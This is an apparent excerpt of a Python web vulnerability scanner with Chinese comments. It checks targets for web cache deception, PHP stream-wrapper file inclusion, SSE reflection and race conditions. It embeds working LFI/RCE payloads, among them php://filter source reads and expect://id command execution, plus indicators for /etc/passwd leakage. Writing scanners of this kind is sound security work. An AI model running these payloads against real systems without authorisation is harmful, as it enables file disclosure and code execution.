    def _check_cache_deception(self, url, context=None):
        """缓存欺骗：路径/后缀欺骗下缓存页返回私有标记即命中。"""
        vulnerabilities = []
        private_markers = ("logout", "password", "session", "csrf", "email", "token", "account", "profile")
        for trick in self._CACHE_DECEPTION_TRICKS:
            test_url = url + trick
            try:
                resp = self.http_client.get(test_url)
            except Exception as e:
                logger.debug(f"缓存欺骗: {e}")
                continue
            if not resp:
                continue
            body = (getattr(resp, "text", "") or "").lower()
            if getattr(resp, "status_code", 0) == 200 and any(m in body for m in private_markers):
                vulnerabilities.append({
                    "type": "Web Cache Deception", "severity": "medium", "url": test_url,
                    "parameter": "", "payload": trick,
                    "evidence": f"缓存欺骗路径 {trick} 返回含私有标记内容",
                    "description": "缓存欺骗可泄露经认证的私有内容",
                    "remediation": "配置缓存规则忽略路径/后缀欺骗",
                })
                break
        return vulnerabilities

    _PHP_WRAPPER_PAYLOADS = [
        "php://filter/convert.base64-encode/resource=index.php",
        "expect://id",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
        "phar://upload.phar",
    ]
    _PHP_INDICATORS = ("root:x:0:0", "PD9waHA", "<?php", "phpinfo()", "allow_url_include", "www-data")

    def _check_php_webshell(self, url, context=None):
        """PHP 流包装器/LFI：危险 wrapper 注入，源码/命令指示符命中。"""
        vulnerabilities = []
        targets = list(self._injection_targets(url, context)) or self._fallback_targets(url, context)
        for surface, param_name in targets:
            for payload in self._PHP_WRAPPER_PAYLOADS:
                resp = self._inject_and_get(url, context, surface, param_name, payload)
                if not resp:
                    continue
                body = getattr(resp, "text", "") or ""
                for ind in self._PHP_INDICATORS:
                    if ind in body:
                        vulnerabilities.append({
                            "type": "PHP Wrapper / Webshell", "severity": "high", "url": url,
                            "parameter": param_name, "payload": payload,
                            "evidence": f"指示符命中: {ind}",
                            "description": "PHP 流包装器/LFI 可能允许读取源码或 RCE",
                            "remediation": "禁用危险流包装器，校验并白名单化文件路径",
                        })
                        return vulnerabilities
        return vulnerabilities

    def _check_sse_injection(self, url, context=None):
        """SSE 注入：向 event-stream 端点注入标记，检测回显。"""
        vulnerabilities = []
        marker = "deepeye_sse_xss"
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            return vulnerabilities
        key = list(qs.keys())[0]
        qs2 = {k: list(v) for k, v in qs.items()}
        qs2[key] = [marker]
        test_url = urlunparse(parsed._replace(query=urlencode(qs2, doseq=True)))
        resp = self.http_client.get(test_url, headers={"Accept": "text/event-stream"})
        if not resp:
            return vulnerabilities
        body = getattr(resp, "text", "") or ""
        ct = str((getattr(resp, "headers", {}) or {}).get("Content-Type", ""))
        if marker in body and "event-stream" in ct:
            vulnerabilities.append({
                "type": "SSE Injection", "severity": "medium", "url": url,
                "parameter": key, "payload": marker,
                "evidence": "SSE 流反射了注入标记",
                "description": "SSE 端点反射用户输入，可能导致 DOM XSS",
                "remediation": "净化 SSE 输出，设置正确 Content-Type",
            })
        return vulnerabilities

    def _check_race_condition(self, url, context=None):
        """竞态条件：对状态变更端点并发探测，响应状态不一致即命中。"""
        vulnerabilities = []
        path = (urlparse(url).path or "").lower()
        if not re.search(r"(login|coupon|order|transfer|payment|checkout|register|apply)", path):
            return vulnerabilities
        from concurrent.futures import ThreadPoolExecutor
        statuses = []

        def _hit(_):
            try:
                r = self.http_client.post(url, data={})
                return getattr(r, "status_code", 0) if r else None
            except Exception:
                return None

        try:
            with ThreadPoolExecutor(max_workers=8) as ex:
                for st in ex.map(_hit, range(8)):
                    if st is not None:
                        statuses.append(st)
        except Exception as e:
            logger.debug(f"竞态条件: {e}")
            return vulnerabilities
        if len(set(statuses)) >= 3:
            vulnerabilities.append({
                "type": "Race Condition", "severity": "medium", "url": url,
                "parameter": "", "payload": f"并发8次，状态码 {sorted(set(statuses))}",
                "evidence": f"并发请求返回不一致状态码: {sorted(statuses)}",
                "description": "端点对并发请求返回不一致状态，可能存在 TOCTOU 竞态",
                "remediation": "对状态变更操作加锁/幂等控制",
            })
        return vulnerabilities
